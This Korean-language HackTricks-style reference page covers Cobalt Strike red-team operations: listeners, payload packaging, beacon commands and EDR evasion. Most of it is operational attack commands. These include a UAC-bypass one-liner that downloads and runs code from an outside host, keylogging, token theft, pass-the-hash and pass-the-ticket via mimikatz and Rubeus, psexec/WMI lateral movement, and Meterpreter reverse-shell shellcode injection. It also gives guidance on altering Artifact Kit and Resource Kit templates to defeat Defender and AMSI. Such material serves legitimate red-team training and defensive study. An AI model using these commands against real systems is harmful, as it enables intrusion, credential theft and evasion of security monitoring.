# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit`에서 어디에서 listen할지, 어떤 종류의 beacon을 사용할지(http, dns, smb...) 등을 선택할 수 있습니다.

### Peer2Peer Listeners

이러한 listeners의 beacon은 C2와 직접 통신할 필요 없이 다른 beacon을 통해 통신할 수 있습니다.

`Cobalt Strike -> Listeners -> Add/Edit`에서 TCP 또는 SMB beacon을 선택해야 합니다.

* **TCP beacon은 선택한 port에 listener를 설정합니다**. TCP beacon에 연결하려면 다른 beacon에서 `connect <ip> <port>` 명령을 사용합니다.
* **smb beacon은 선택한 이름의 pipename에서 listen합니다**. SMB beacon에 연결하려면 `link [target] [pipe]` 명령을 사용해야 합니다.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* HTA 파일에는 **`HTMLApplication`**
* macro가 포함된 office 문서에는 **`MS Office Macro`**
* .exe, .dll 또는 service .exe에는 **`Windows Executable`**
* **stageless** .exe, .dll 또는 service .exe에는 **`Windows Executable (S)`** (staged보다 stageless가 더 좋으며 IoC가 적음)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)`는 bitsadmin, exe, powershell, python 등의 형식으로 Cobalt Strike에서 beacon을 다운로드하는 script/executable을 생성합니다.

#### Host Payloads

web server에서 host할 파일이 이미 있다면 `Attacks -> Web Drive-by -> Host File`로 이동하여 host할 파일과 web server config를 선택합니다.

### Beacon Options

<details>
<summary>Beacon 옵션 및 명령</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Custom agent는 등록/체크인하고 task를 수신하기 위해 Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile)만 사용하면 됩니다. profile에 정의된 동일한 URI/header/metadata crypto를 구현하면 Cobalt Strike UI를 재사용하여 tasking 및 output을 처리할 수 있습니다.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script (예: `CustomBeacon.cna`)는 non-Windows beacon의 payload generation을 래핑하여 operator가 listener를 선택하고 GUI에서 직접 ELF payload를 생성할 수 있게 합니다.
- Team Server에 노출되는 Linux task handler의 예: `sleep`, `cd`, `pwd`, `shell` (임의의 command 실행), `ls`, `upload`, `download`, `exit`. 이는 Team Server가 예상하는 task ID에 매핑되며, 적절한 형식으로 output을 반환하도록 server-side에서 구현해야 합니다.
- Linux에서의 BOF support는 [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader)를 사용하여 Beacon Object Files를 in-process로 로드함으로써 추가할 수 있습니다 (Outflank-style BOF도 지원). 이를 통해 새로운 process를 생성하지 않고 implant의 context/privileges 내에서 modular post-exploitation을 실행할 수 있습니다.<sup>[[2]](#references)[[3]](#references)</sup>
- Windows Beacons와의 pivoting parity를 유지하려면 custom beacon에 SOCKS handler를 embed합니다. operator가 `socks <port>`를 실행하면 implant는 local proxy를 열어 compromised Linux host를 통해 operator tooling을 internal network로 라우팅해야 합니다.

## Opsec

### Execute-Assembly

**`execute-assembly`**는 remote process injection을 사용하는 **sacrificial process**를 통해 지정된 program을 실행합니다. process에 inject하려면 모든 EDR이 검사하는 특정 Win API를 사용하므로 매우 noisy합니다. 하지만 동일한 process에 무언가를 로드하는 데 사용할 수 있는 custom tool도 있습니다.

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Cobalt Strike에서는 BOF (Beacon Object Files)도 사용할 수 있습니다: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Agressor Script `https://github.com/outflanknl/HelpColor`는 Cobalt Strike에 `helpx` command를 생성합니다. 이 command는 해당 command가 BOF인지 (green), Frok&Run인지 (yellow) 및 유사한 유형인지, 또는 ProcessExecution, injection 및 유사한 유형인지 (red)를 나타내도록 command에 color를 표시합니다. 이를 통해 어떤 command가 더 stealthy한지 파악할 수 있습니다.

### Act as the user

`Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`와 같은 event를 확인할 수 있습니다.

- Security EID 4624 - 일반적인 operating hour를 파악하기 위해 모든 interactive logon을 확인합니다.
- System EID 12,13 - shutdown/startup/sleep frequency를 확인합니다.
- Security EID 4624/4625 - inbound valid/invalid NTLM attempt를 확인합니다.
- Security EID 4648 - plaintext credential을 사용하여 logon할 때 생성되는 event입니다. process가 이를 생성했다면 해당 binary가 config file 또는 code 내부에 credential을 clear text로 보유하고 있을 가능성이 있습니다.

cobalt strike에서 `jump`를 사용할 때는 새 process가 더 정상적으로 보이도록 `wmi_msbuild` method를 사용하는 것이 좋습니다.

### Use computer accounts

Defender는 user가 생성한 이상한 behavior를 확인하는 경우가 많으며 **monitoring에서 `*$`와 같은 service account 및 computer account를 제외**합니다. 이러한 account를 사용하여 lateral movement 또는 privilege escalation을 수행할 수 있습니다.

### Use stageless payloads

Stageless payload는 C2 server에서 second stage를 download할 필요가 없으므로 staged payload보다 덜 noisy합니다. 따라서 initial connection 이후에는 network traffic이 발생하지 않아 network-based defense에 탐지될 가능성이 낮아집니다.

### Tokens & Token Store

token을 steal하거나 generate할 때는 주의해야 합니다. EDR이 모든 thread의 모든 token을 enumerate하여 process 내에서 **다른 user에 속한 token** 또는 SYSTEM token까지 찾을 수 있기 때문입니다.

이를 통해 token을 **beacon별로** 저장할 수 있으므로 동일한 token을 반복해서 steal할 필요가 없습니다. 이는 lateral movement 또는 stolen token을 여러 번 사용해야 할 때 유용합니다.

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

lateral movement를 수행할 때는 일반적으로 **새 token을 generate하거나 pass the hash attack을 수행하는 것보다 token을 steal하는 편이** 좋습니다.

### Guardrails

Cobalt Strike에는 Defender가 탐지할 수 있는 특정 command 또는 action의 사용을 방지하는 **Guardrails**라는 feature가 있습니다. Guardrails는 lateral movement 또는 privilege escalation에 일반적으로 사용되는 `make_token`, `jump`, `remote-exec` 등의 특정 command를 block하도록 구성할 수 있습니다.

또한 repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks)에는 payload를 실행하기 전에 고려할 수 있는 일부 check와 idea도 포함되어 있습니다.

### Tickets encryption

AD에서는 ticket encryption에 주의해야 합니다. 기본적으로 일부 tool은 Kerberos ticket에 RC4 encryption을 사용하는데, 이는 AES encryption보다 덜 안전하며 최신 environment에서는 기본적으로 AES를 사용합니다. weak encryption algorithm을 monitoring하는 Defender가 이를 탐지할 수 있습니다.

### Avoid Defaults

Cobalt Stricke를 사용할 때 기본적으로 SMB pipe의 이름은 `msagent_####` 및 `"status_####"`입니다. 이러한 이름을 변경하십시오. Cobal Strike에서 다음 command를 사용하여 기존 pipe의 이름을 확인할 수 있습니다: `ls \\.\pipe\`

또한 SSH session에서는 `\\.\pipe\postex_ssh_####`라는 pipe가 생성됩니다. `set ssh_pipename "<new_name>";`을 사용하여 변경하십시오.

poext exploitation attack에서도 `\\.\pipe\postex_####` pipe를 `set pipename "<new_name>"`으로 수정할 수 있습니다.

Cobalt Strike profile에서는 다음과 같은 항목도 수정할 수 있습니다.

- `rwx` 사용 방지
- process injection behavior의 동작 방식 (`process-inject {...}` block에서 사용할 API)
- "fork and run"의 동작 방식 (`post-ex {…}` block)
- sleep time
- memory에 로드할 binary의 max size
- `stage {...}` block을 사용한 memory footprint 및 DLL content
- network traffic

### Bypass memory scanning

일부 ERD는 memory에서 알려진 malware signature를 scan합니다. Coblat Strike에서는 `sleep_mask` function을 memory에서 backdoor를 encrypt할 수 있는 BOF로 수정할 수 있습니다.

### Noisy proc injections

process에 code를 inject하는 것은 일반적으로 매우 noisy합니다. **일반적인 process는 보통 이 action을 수행하지 않으며 이를 수행하는 방식도 매우 제한적**이기 때문입니다. 따라서 behavior-based detection system에 탐지될 수 있습니다. 또한 EDR이 network를 scan하여 **disk에 존재하지 않는 code를 포함한 thread**를 찾는 방식으로 탐지할 수도 있습니다 (단, JIT를 사용하는 browser와 같은 process에서는 일반적으로 발생합니다). 예: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

새 process를 spawn할 때는 탐지를 피하기 위해 process 간에 **정상적인 parent-child** relationship을 유지하는 것이 중요합니다. svchost.exec가 iexplorer.exe를 실행한다면 의심스럽게 보입니다. 정상적인 Windows environment에서 svchost.exe는 iexplorer.exe의 parent가 아니기 때문입니다.

Cobalt Strike에서 새 beacon을 spawn하면 기본적으로 **`rundll32.exe`**를 사용하는 process가 생성되어 새 listener를 실행합니다. 이는 매우 stealthy하지 않으며 EDR에 쉽게 탐지될 수 있습니다. 또한 `rundll32.exe`가 아무런 argument 없이 실행되므로 더욱 의심스럽습니다.

다음 Cobalt Strike command를 사용하면 새 beacon을 spawn할 다른 process를 지정하여 탐지 가능성을 낮출 수 있습니다.
```bash
spawnto x86 svchost.exe
```
You can aso change this setting **`spawnto_x86` and `spawnto_x64`** in a profile.

### 공격자 traffic 프록시

공격자는 때때로 linux machines에서도 도구를 로컬에서 실행하고, victims의 traffic이 해당 도구에 도달하도록 해야 합니다 (예: NTLM relay).

또한 때때로 pass-the.hash 또는 pass-the-ticket attack을 수행할 때, 공격자는 victim machine의 LSASS process를 수정하는 대신 이 hash 또는 ticket을 자신의 LSASS process에 로컬로 **추가한** 다음 이를 통해 pivot하는 것이 더 stealthier합니다.

그러나 **생성되는 traffic에 주의해야 합니다**. backdoor process에서 흔하지 않은 traffic (kerberos?)을 전송할 수 있기 때문입니다. 이를 위해 browser process로 pivot할 수 있습니다 (다만 process에 자신을 injecting하다가 caught될 수 있으므로, 이를 수행할 stealth 방법을 고려해야 합니다).


### AV 회피

#### AV/AMSI/ETW Bypass

페이지를 확인하세요:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

일반적으로 `/opt/cobaltstrike/artifact-kit`에서 Cobalt Strike가 binary beacons를 생성하는 데 사용할 payloads의 code와 pre-compiled templates (`/src-common`)를 찾을 수 있습니다.

생성된 backdoor (또는 compiled template만)를 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)와 함께 사용하면 defender를 trigger하는 원인을 찾을 수 있습니다. 보통 string입니다. 따라서 final binary에 해당 string이 나타나지 않도록 backdoor를 생성하는 code를 수정하면 됩니다.

code를 수정한 후에는 같은 directory에서 `./build.sh`를 실행하고 `dist-pipe/` folder를 Windows client의 `C:\Tools\cobaltstrike\ArtifactKit`에 복사합니다.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Cobalt Strike가 원하는 disk의 resources를 사용하고 loaded된 resources를 사용하지 않도록 하려면 aggressive script `dist-pipe\artifact.cna`를 load하는 것을 잊지 마세요.

#### Resource Kit

ResourceKit folder에는 PowerShell, VBA 및 HTA를 포함한 Cobalt Strike의 script-based payloads용 templates가 들어 있습니다.

templates와 함께 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 defender가 (이 경우 AMSI가) 무엇을 문제 삼는지 확인하고 이를 수정할 수 있습니다:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
감지된 줄을 수정하면 탐지되지 않는 template을 생성할 수 있습니다.

원하는 디스크의 resources를 사용하고 로드된 resources를 사용하지 않도록 Cobalt Strike에 지시하려면, aggressive script `ResourceKit\resources.cna`를 로드하는 것을 잊지 마세요.

#### Function hooks | Syscall

Function hooking은 ERDs가 malicious activity를 탐지하는 데 사용하는 매우 일반적인 방법입니다. Cobalt Strike에서는 **`None`** config를 사용해 표준 Windows API calls 대신 **syscalls**를 사용하거나, malleable profile에서 **`Direct`** setting으로 함수의 `Nt*` version을 사용하거나, **`Indirect`** option으로 `Nt*` function을 건너뛰어 이러한 hooks를 우회할 수 있습니다. 시스템에 따라 특정 option이 다른 option보다 더 stealth할 수 있습니다.

이는 profile에서 설정하거나 **`syscall-method`** command를 사용해 설정할 수 있습니다.

그러나 이 방법 역시 noisy할 수 있습니다.

Cobalt Strike에서 function hooks를 우회하기 위해 제공하는 option 중 하나는 다음을 사용해 해당 hooks를 제거하는 것입니다: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

다음 [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) 또는 [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)를 사용해 어떤 functions가 hooked되었는지도 확인할 수 있습니다.




<details>
<summary>기타 Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## 참고 자료

- [1] [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [4] [Cobalt Strike metadata encryption에 대한 Unit42 분석](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Cobalt Strike traffic에 대한 SANS ISC diary](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
